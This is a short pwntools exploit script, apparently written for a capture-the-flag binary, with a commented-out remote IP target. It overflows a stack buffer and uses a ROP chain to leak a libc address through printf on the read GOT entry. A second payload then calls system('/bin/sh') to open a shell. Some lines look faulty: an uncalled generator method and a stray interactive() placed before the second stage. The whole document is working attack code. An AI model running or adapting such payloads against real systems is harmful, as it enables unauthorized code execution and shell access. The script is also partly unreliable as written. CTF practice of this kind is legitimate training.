from pwn import*
context.log_level ='DEBUG'
p = process('./main')
#p = remote('183.129.189.60',10039)
elf =ELF('./main')
libc =ELF('./libc-2.27.so')
p.sendlineafter('name: ',str(0x100))
payload ='\x00'*0x88 + p64(0x400823) + p64(elf.got['read']) + p64(elf.plt['printf']) + p64(0x400769)
gdb.attach(p)
p.sendlineafter('name?',payload)
libc.address = u64(p.recv(6).ljust(8,'\x00')) - libc.sym['read']
p.interactive()
p.sendline(str(0x100))
p.sendline('A'*0x88 + p64(0x400823) + p64(libc.search('/bin/sh').next) + p64(libc.sym['system']))
p.interactive()
